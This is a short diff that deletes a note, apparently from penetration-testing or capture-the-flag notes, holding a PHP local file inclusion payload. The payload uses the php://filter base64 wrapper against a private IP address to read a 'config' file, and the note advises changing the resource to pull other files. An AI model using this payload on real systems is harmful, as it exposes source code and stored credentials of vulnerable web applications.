@@ -1,3 +1,0 @@
-http://192.168.1.20/?page=php://filter/convert.base64-encode/resource=config
-
-Change the resource depending on the file you want. Be aware that some files may not show up, be sure to try a few.
